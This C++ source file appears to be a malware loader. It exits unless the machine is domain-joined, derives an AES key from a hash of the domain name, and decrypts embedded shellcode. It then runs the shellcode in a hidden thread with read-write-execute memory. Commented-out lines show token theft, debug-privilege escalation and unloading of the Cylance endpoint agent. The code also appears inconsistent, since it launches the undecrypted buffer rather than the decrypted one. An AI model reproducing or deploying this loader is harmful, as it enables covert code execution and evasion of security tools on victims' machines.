#include "Privileges.h"
#include "encrypted.h"
#include "ProcHelpers.h"
#include "Cylance.h"
#include "MemInfo.h"
#include "antisandbox.h"
#include "Crypto.h"
#include <iostream>
#include <string.h>
#include <cstdlib>



int main() {
	OptPrivs* p = new OptPrivs;
	std::vector<MemInfoModule> me = MemInfo::CurrentLoadedModules();

	LPVOID baseAddr = me[0].baseAddr;

	//ProcHelper::ImportListPopulate(baseAddr);
	//POWERSHELL_SHELLCODE_BUF

	PH_THREAD_INFO pt;
	ZeroMemory(&pt, sizeof(pt));

	pt.ThreadCreateFlags = CREATE_NO_WINDOW;
	int sizeOfShellcode = LAUNCH_SHELLCODE_LEN;
	pt.StackSpace = 0x00010000;

	//Cylance::FreeLibraryCylance();

	ProcHelper::ImportListPopulate(baseAddr);

	//ProcHelper::SpawnThreadShellcode((unsigned char*)buf, sizeOfShellcode, pt);

	SandboxInformation si;
	ZeroMemory(&si, sizeof(SandboxInformation));
	if (AntiSandbox::isDomainJoined(&si)) {
		// do something
	}
	else {
		exit(0);
	}
	int domainNameLen = lstrlenW(si.Workgroup);
	char* key = new char[domainNameLen];
	uint8_t* buf = (uint8_t*)& LAUNCH_SHELLCODE_BUF;

	char* domainName = new char[domainNameLen];
	char* sha256_uname = new char[256];

	ZeroMemory(sha256_uname, 256);
	DWORD sha_bytes_returned = 256;

	size_t charsConverted;

	if (si.Domain == NULL && si.Workgroup != NULL) {
		si.Domain = si.Workgroup;
	}
	memset(domainName, 0, domainNameLen);
	if (wcstombs_s(&charsConverted, domainName, (size_t)domainNameLen+1, si.Domain, (size_t)domainNameLen)) {
		exit(-2);
	}
	if (!OptCrypto::GetSHA256Hash(domainName, domainNameLen, (BYTE*)sha256_uname, &sha_bytes_returned))
		exit(-2);

	uint8_t* dec_buf = OptCrypto::AESCBCDecrypt(buf, (uint8_t*)sha256_uname, (uint8_t*)LAUNCH_IV, LAUNCH_SHELLCODE_LEN);
	
	ProcExecute pe;
	ZeroMemory(&pe, sizeof(ProcExecute));
	pe = ProcHelper::CreateNewProcExec(732, "", TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE);
	//HANDLE shellcodeFiber = NULL;
	pt.pagePermissions = PAGE_EXECUTE_READWRITE;
	//shellcodeFiber = ProcHelper::CreateFiberShellcode(dec_buf, sizeOfShellcode, &pt);
	//ProcHelper::RunFiberShellcode(shellcodeFiber, &pt);// do your own damn scheduling
	//std::cout << "attempting to steal token and create new thread" << std::endl;
	//ProcHelper::EnableDebugPriv();
	//ProcHelper::PESetTokenFromPID(pe);
	ProcHelper::SpawnThreadShellcode(LAUNCH_SHELLCODE_BUF, LAUNCH_SHELLCODE_LEN, &pt);
	Sleep(INFINITE);
}